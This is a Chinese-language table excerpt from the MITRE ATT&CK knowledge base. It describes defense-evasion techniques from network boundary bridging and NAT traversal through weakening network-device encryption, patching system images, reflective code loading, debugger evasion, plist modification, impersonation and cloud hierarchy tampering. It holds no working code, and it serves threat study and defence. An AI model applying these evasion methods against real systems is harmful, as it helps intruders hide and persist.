| [T1599](../techniques/T1599.md) | 网络边界桥接 | 对手可能通过破坏外围网络设备或负责网络分段的内部设备来桥接网络边界。破坏这些设备可能使对手能够绕过流量路由限制，从而将受信任和不受信任的网络分开。  路由器和防火墙等设备可用于在受信任和不受信任的网络之间创建边界。它们通过限制流量类型来执行组织策略，以减少此类连接固有的风险。流量限制可以通过禁止 IP 地址、层 4 协议端口或通过深度包检测来识别应用程序来实现。为了与网络的其余部分进行通信，这些设备可以是直接可寻址的或透明的，但它们的操作模式对对手如何在被破坏时绕过它们没有影响。  当对手控制了这样的边界设备时，他们可以绕过其策略执行，将通常被禁止的流量跨越信任边界传输到两个分离的网络之间而不受阻碍。通过获得设备上的足够权限，对手可以重新配置设备以允许他们想要的流量，然后他们可以进一步实现目标，例如通过[多跳代理](https://attack.mitre.org/techniques/T1090/003)进行命令和控制或通过[流量复制](https://attack.mitre.org/techniques/T1020/001)进行数据外传。对手还可能针对负责网络分段的内部设备，并结合[内部代理](https://attack.mitre.org/techniques/T1090/001)滥用这些设备以实现相同的目标。(引用: Kaspersky ThreatNeedle Feb 2021) 在边界设备分隔两个不同组织的情况下，对手还可以促进横向移动到新的受害者环境中。 |
| [T1599.001](../techniques/T1599.001.md) | 网络地址转换遍历 | 对手可能通过修改网络设备的网络地址转换 (NAT) 配置来跨越网络边界。对 NAT 的恶意修改可能使对手能够绕过对流量路由的限制，从而将受信任和不受信任的网络分开。  在将数据包从一个网络传递到另一个网络的过程中，路由器和防火墙等网络设备可能会实施 NAT。在执行 NAT 时，网络设备将重写 IP 地址头的源地址和/或目标地址。一些网络设计需要 NAT 才能使数据包跨越边界设备。这种情况的一个典型例子是内部网络使用不可路由的互联网地址的环境。(引用: RFC1918)  当对手控制了网络边界设备时，他们可以利用现有的 NAT 配置在两个分离的网络之间发送流量，或者他们可以实施自己设计的 NAT 配置。在需要 NAT 才能正常工作的网络设计中，这使对手能够克服固有的路由限制，这些限制通常会阻止他们访问边界设备后面的受保护系统。在不需要 NAT 的网络设计中，地址转换可以被对手用来掩盖他们的活动，因为更改跨越网络边界设备的数据包的地址可以使防御者更难监控数据传输。  对手可能会使用[补丁系统映像](https://attack.mitre.org/techniques/T1601/001)来更改网络设备的操作系统，实施他们自己的自定义 NAT 机制以进一步掩盖他们的活动。 |
| [T1600](../techniques/T1600.md) | 削弱加密 | 对手可能会破坏网络设备的加密能力，以绕过原本保护数据通信的加密。(引用: Cisco Synful Knock Evolution)  加密可以用来保护传输的网络流量，以保持其机密性（防止未经授权的披露）和完整性（防止未经授权的更改）。加密密码用于将明文消息转换为密文，并且在没有相关解密密钥的情况下解密通常需要大量计算。通常，较长的密钥会增加密码分析的成本，或在没有密钥的情况下解密。  对手可以破坏和操纵执行网络流量加密的设备。例如，通过行为如[修改系统映像](https://attack.mitre.org/techniques/T1601)、[减少密钥空间](https://attack.mitre.org/techniques/T1600/001)和[禁用加密硬件](https://attack.mitre.org/techniques/T1600/002)，对手可以负面影响和/或消除设备安全加密网络流量的能力。这增加了未经授权披露的风险，并可能有助于数据操纵、凭据访问或收集工作。(引用: Cisco Blog Legacy Device Attacks) |
| [T1600.001](../techniques/T1600.001.md) | 减少密钥空间 | 对手可能会通过减少加密通信的密码强度来减少解密网络上传输的数据所需的工作量。(引用: Cisco Synful Knock Evolution)  对手可以通过减少用于将明文转换为密文的软件使用的密钥大小（例如，从数百或数千字节减少到仅几个字节）来削弱受感染网络设备上的加密软件。结果，对手显著减少了在没有密钥的情况下解密受保护信息所需的工作量。  对手可能会使用通过[修改系统映像](https://attack.mitre.org/techniques/T1601)引入系统的[网络设备CLI](https://attack.mitre.org/techniques/T1059/008)中的专用命令修改使用的密钥大小和其他加密参数，以更改设备的配置。(引用: Cisco Blog Legacy Device Attacks) |
| [T1600.002](../techniques/T1600.002.md) | 禁用加密硬件 | 对手禁用网络设备的专用硬件加密，这可能使他们能够利用软件加密中的弱点，以减少收集、操纵和外传传输数据所涉及的工作量。  许多网络设备（如路由器、交换机和防火墙）对网络流量进行加密，以确保跨网络的传输安全。通常，这些设备配备了专用的加密硬件，以大大提高加密过程的速度，并防止恶意篡改。当对手控制此类设备时，他们可能会禁用专用硬件，例如，通过使用[修改系统镜像](https://attack.mitre.org/techniques/T1601)，强制使用软件在通用处理器上执行加密。这通常与攻击结合使用，以削弱软件中密码的强度（例如，[减少密钥空间](https://attack.mitre.org/techniques/T1600/001)）。(引用: Cisco Blog Legacy Device Attacks) |
| [T1601](../techniques/T1601.md) | 修改系统映像 | 对手可能会更改嵌入式网络设备的操作系统，以削弱防御并为自己提供新的能力。在这些设备上，操作系统通常是单片的，大多数设备功能和能力都包含在一个文件中。  要更改操作系统，对手通常只需影响这个文件，替换或修改它。这可以在系统运行时在内存中实时完成，以立即生效，或在存储中进行更改，以在网络设备的下次启动时实施更改。 |
| [T1601.001](../techniques/T1601.001.md) | 修补系统镜像 | 对手可能会修改网络设备的操作系统，以引入新功能或削弱现有防御。(引用: Killing the myth of Cisco IOS rootkits) (引用: Killing IOS diversity myth) (引用: Cisco IOS Shellcode) (引用: Cisco IOS Forensics Developments) (引用: Juniper Netscreen of the Dead) 一些网络设备采用单片架构，其中整个操作系统和设备的大部分功能都包含在一个文件中。对手可能会在存储中更改此文件，以便在将来启动时加载，或在运行时在内存中更改。  要在存储中更改操作系统，对手通常会使用设备操作员可用的标准程序。这可能涉及通过网络设备上常用的协议（如 TFTP、FTP、SCP 或控制台连接）下载新文件。原始文件可能会被覆盖，或者可以在其旁边写入新文件，并重新配置设备以启动到受损镜像。  要在内存中更改操作系统，对手通常可以使用两种方法之一。在第一种方法中，对手将利用原始、未更改的运行操作系统中的本机调试命令，允许他们直接修改包含运行操作系统的相关内存地址。此方法通常需要对设备的管理级别访问权限。  在第二种方法中，对手将利用引导加载程序。引导加载程序是设备启动时加载的第一个软件，它会启动操作系统。对手可能会利用先前植入引导加载程序中的恶意代码（例如通过 [ROMMONkit](https://attack.mitre.org/techniques/T1542/004) 方法），直接操纵内存中的运行操作系统代码。引导加载程序中的恶意代码为对手提供了直接内存操作的能力，允许他们在运行时修补操作系统。  通过修改存储在系统镜像文件中的指令，对手可以削弱现有防御或提供设备之前没有的新功能。可以削弱的现有防御示例包括通过 [削弱加密](https://attack.mitre.org/techniques/T1600) 的加密、通过 [网络设备认证](https://attack.mitre.org/techniques/T1556/004) 的认证和通过 [网络边界桥接](https://attack.mitre.org/techniques/T1599) 的外围防御。为对手目的添加的新功能包括 [键盘记录](https://attack.mitre.org/techniques/T1056/001)、[多跳代理](https://attack.mitre.org/techniques/T1090/003) 和 [端口敲击](https://attack.mitre.org/techniques/T1205/001)。  对手还可能妥协操作系统中的现有命令以生成虚假输出误导防御者。当此方法与 [降级系统镜像](https://attack.mitre.org/techniques/T1601/002) 结合使用时，受损系统命令的一个示例可能包括更改显示当前运行操作系统版本的命令的输出。通过修补操作系统，对手可以更改此命令以显示他们通过系统降级替换的原始、更高版本号。  当操作系统在存储中修补时，可以在驻留存储（通常是一种非易失性闪存）或通过 [TFTP 启动](https://attack.mitre.org/techniques/T1542/005) 实现。  当技术在内存中运行的操作系统上执行而不是在存储的副本上执行时，此技术在重启后不会保留。然而，操作系统的实时内存修改可以与 [ROMMONkit](https://attack.mitre.org/techniques/T1542/004) 结合使用以实现持久性。 |
| [T1601.002](../techniques/T1601.002.md) | 降级系统镜像 | 对手可能通过安装网络设备操作系统的旧版本来削弱安全性。网络设备上的旧操作系统版本通常具有较弱的加密算法，并且通常具有较少/较少更新的防御功能。(引用: Cisco Synful Knock Evolution)  在嵌入式设备上，降级版本通常只需要替换存储中的操作系统文件。对于大多数嵌入式设备，这可以通过下载所需版本的操作系统文件并重新配置设备以在下次系统重启时从该文件启动来实现。对手然后可以立即重启设备以实施更改，或者他们可以等待系统下次重启。  降级系统镜像到旧版本可能允许对手通过启用诸如[削弱加密](https://attack.mitre.org/techniques/T1600)之类的行为来规避防御。降级系统镜像可以单独完成，也可以与[修补系统镜像](https://attack.mitre.org/techniques/T1601/001)结合使用。 |
| [T1610](../techniques/T1610.md) | 部署容器 | 对手可能会在环境中部署容器以促进执行或规避防御。在某些情况下，对手可能会部署一个新容器来执行与特定镜像或部署相关的进程，例如执行或下载恶意软件的进程。在其他情况下，对手可能会部署一个没有网络规则、用户限制等配置的新容器，以绕过环境中的现有防御。在Kubernetes环境中，对手可能会尝试在特定节点上部署一个特权或易受攻击的容器，以便[逃逸到主机](https://attack.mitre.org/techniques/T1611)并访问节点上运行的其他容器。(引用: AppSecco Kubernetes Namespace Breakout 2020)  容器可以通过多种方式部署，例如通过Docker的<code>create</code>和<code>start</code> API或通过Kubernetes仪表板或Kubeflow等Web应用程序。(引用: Docker Containers API)(引用: Kubernetes Dashboard)(引用: Kubeflow Pipelines) 在Kubernetes环境中，容器可以通过工作负载如ReplicaSets或DaemonSets部署，这可以允许容器在多个节点上部署。(引用: Kubernetes Workload Management) 对手可能会基于检索到的或构建的恶意镜像或从运行时下载并执行恶意有效负载的良性镜像部署容器。(引用: Aqua Build Images on Hosts) |
| [T1612](../techniques/T1612.md) | 在主机上构建镜像 | 对手可能会直接在主机上构建容器镜像，以绕过监控从公共注册表检索恶意镜像的防御。可以向 Docker API 发送远程<code>build</code>请求，其中包含一个 Dockerfile，该文件从公共或本地注册表中提取一个普通基础镜像（例如 alpine），然后在其上构建自定义镜像。(引用: Docker Build Image)  对手可能会利用该<code>build</code> API 在主机上构建一个包含从其 C2 服务器下载的恶意软件的自定义镜像，然后他们可能会利用[部署容器](https://attack.mitre.org/techniques/T1610)使用该自定义镜像。(引用: Aqua Build Images on Hosts)(引用: Aqua Security Cloud Native Threat Report June 2021) 如果基础镜像是从公共注册表中提取的，防御措施可能不会将镜像检测为恶意镜像，因为它是普通镜像。如果基础镜像已经存在于本地注册表中，则提取可能被认为更不引人注意，因为镜像已经在环境中。 |
| [T1620](../techniques/T1620.md) | 反射代码加载 | 对手可能会反射性地将代码加载到进程中，以隐藏恶意有效负载的执行。反射加载涉及在进程的内存中直接分配然后执行有效负载，而不是创建由磁盘上的文件路径支持的线程或进程（例如，[共享模块](https://attack.mitre.org/techniques/T1129)）。  反射性加载的有效负载可能是编译的二进制文件、匿名文件（仅存在于 RAM 中），或只是无文件的可执行代码片段（例如：位置无关的 shellcode）。(引用: Introducing Donut)(引用: S1 Custom Shellcode Tool)(引用: Stuart ELF Memory)(引用: 00sec Droppers)(引用: Mandiant BYOL) 例如，[PowerShell](https://attack.mitre.org/techniques/T1059/001) 执行的 `Assembly.Load()` 方法可能会被滥用以将原始代码加载到正在运行的进程中。(引用: Microsoft AssemblyLoad)  反射性代码注入与[进程注入](https://attack.mitre.org/techniques/T1055)非常相似，不同之处在于“注入”将代码加载到进程自己的内存中，而不是单独的进程中。反射性加载可能会规避基于进程的检测，因为任意代码的执行可能会被掩盖在合法或其他无害的进程中。直接将有效负载反射性加载到内存中还可以避免在磁盘上创建文件或其他工件，同时还可以使恶意软件在执行之前保持这些有效负载加密（或以其他方式混淆）。(引用: Stuart ELF Memory)(引用: 00sec Droppers)(引用: Intezer ACBackdoor)(引用: S1 Old Rat New Tricks) |
| [T1622](../techniques/T1622.md) | 调试器规避 | 攻击者可能采用各种手段检测和规避调试器。调试器通常被防御者用于跟踪和/或分析潜在恶意软件负载的执行。(引用: ProcessHacker GitHub)  调试器规避可能包括根据检查调试环境存在的工件结果改变行为。类似于[虚拟化/沙盒规避](https://attack.mitre.org/techniques/T1497)，如果攻击者检测到调试器，他们可能会改变其恶意软件以脱离受害者或隐藏植入物的核心功能。他们还可能在投放次要或附加负载之前搜索调试器工件。  具体检查将根据目标和/或攻击者而有所不同，但可能涉及[Native API](https://attack.mitre.org/techniques/T1106)函数调用，如<code>IsDebuggerPresent()</code>和<code>NtQueryInformationProcess()</code>，或手动检查进程环境块（PEB）的<code>BeingDebugged</code>标志。其他调试工件的检查还可能尝试枚举硬件断点、中断汇编操作码、时间检查，或测量当前进程中是否引发异常（假设存在的调试器会“吞下”或处理潜在错误）。(引用: hasherezade调试)(引用: AlKhaser调试)(引用: vxunderground调试)  攻击者可能在自动发现过程中使用从这些调试器检查中学到的信息来塑造后续行为。调试器还可以通过分离进程或通过循环[Native API](https://attack.mitre.org/techniques/T1106)函数调用（如<code>OutputDebugStringW()</code>）产生的消息用无意义的数据淹没调试日志来规避。(引用: wardle evilquest partii)(引用: Checkpoint Dridex 2021年1月) |
| [T1647](../techniques/T1647.md) | Plist 文件修改 | 对手可能会修改属性列表文件（plist 文件）以启用其他恶意活动，同时可能规避和绕过系统防御。macOS 应用程序使用 plist 文件，例如 <code>info.plist</code> 文件，来存储属性和配置设置，这些设置告知操作系统如何在运行时处理应用程序。Plist 文件是基于 Apple 的 Core Foundation DTD 格式化的 XML 中的键值对结构化元数据。Plist 文件可以以文本或二进制格式保存。(引用: fileinfo plist file description)   对手可以修改 plist 文件中的键值对以影响系统行为，例如隐藏应用程序的执行（即 [隐藏窗口](https://attack.mitre.org/techniques/T1564/003)）或运行其他命令以实现持久性（例如 [启动代理](https://attack.mitre.org/techniques/T1543/001)/[启动守护程序](https://attack.mitre.org/techniques/T1543/004) 或 [重新打开的应用程序](https://attack.mitre.org/techniques/T1547/007)）。  例如，对手可以将恶意应用程序路径添加到 `~/Library/Preferences/com.apple.dock.plist` 文件中，该文件控制出现在 Dock 中的应用程序。对手还可以修改应用程序 <code>info.plist</code> 文件中的 <code>LSUIElement</code> 键以在后台运行应用程序。对手还可以插入键值对以插入环境变量，例如 <code>LSEnvironment</code>，以通过 [动态链接器劫持](https://attack.mitre.org/techniques/T1574/006) 实现持久性。(引用: wardle chp2 persistence)(引用: eset_osx_flashback) |
| [T1656](../techniques/T1656.md) | 冒充 | 对手可能会冒充受信任的人或组织，以说服和欺骗目标代表他们执行某些操作。例如，对手可能会在冒充已知发送者（如高管、同事或第三方供应商）的情况下与受害者沟通（通过 [钓鱼获取信息](https://attack.mitre.org/techniques/T1598)、[网络钓鱼](https://attack.mitre.org/techniques/T1566) 或 [内部鱼叉式网络钓鱼](https://attack.mitre.org/techniques/T1534)）。建立的信任可以被用来实现对手的最终目标，可能针对多个受害者。  在许多商业电子邮件妥协或电子邮件欺诈活动中，对手使用冒充来欺骗受害者——欺骗他们发送资金或透露信息，从而最终实现 [财务盗窃](https://attack.mitre.org/techniques/T1657)。  对手通常还会使用社会工程技术，例如在电子邮件主题行和正文文本中使用操纵性和说服性语言，如“付款”、“请求”或“紧急”，以推动受害者在恶意活动被检测到之前迅速采取行动。这些活动通常专门针对由于工作角色和/或访问权限而能够执行对手目标的人。  冒充通常由侦察技术（如 [收集受害者身份信息](https://attack.mitre.org/techniques/T1589) 和 [收集受害者组织信息](https://attack.mitre.org/techniques/T1591)）以及获取基础设施（如电子邮件域名（即 [域名](https://attack.mitre.org/techniques/T1583/001)））来支持其虚假身份。(引用: CrowdStrike-BEC)  在涉及冒充的活动中可能会有多个受害者。例如，对手可能会 [妥协账户](https://attack.mitre.org/techniques/T1586) 针对一个组织，然后可以用来支持对其他实体的冒充。(引用: VEC) |
| [T1666](../techniques/T1666.md) | 修改云资源层次结构 | 对手可能会尝试修改基础设施即服务（IaaS）环境中的层次结构，以规避防御措施。  IaaS环境通常将资源分组为层次结构，从而改进资源管理并将策略应用于相关组。不同的云提供商的层次结构不同。例如，在AWS环境中，可以将多个帐户分组到一个组织中，而在Azure环境中，可以将多个订阅分组到一个管理组中。(引用: AWS Organizations)(引用: Microsoft Azure Resources)  对手可能会添加、删除或以其他方式修改IaaS层次结构中的资源组。例如，在Azure环境中，获得全局管理员帐户访问权限的对手可能会创建新的订阅以部署资源。他们还可能通过将现有的按需付费订阅从受害者租户转移到对手控制的租户来进行订阅劫持。这将允许对手使用受害者的计算资源，而不会在受害者租户上生成日志。(引用: Microsoft Peach Sandstorm 2023)(引用: Microsoft Subscription Hijacking 2022)  在AWS环境中，具有适当权限的对手可以调用`LeaveOrganization` API，从而使帐户与其所属的AWS组织断开连接，并删除其前组织施加的任何服务控制策略、护栏或限制。或者，对手可以调用`CreateAccount` API，以便在AWS组织中创建一个新帐户。该帐户将使用注册到付款帐户的相同付款方式，但可能不受现有检测或服务控制策略的约束。(引用: AWS RE:Inforce Threat Detection 2024) |
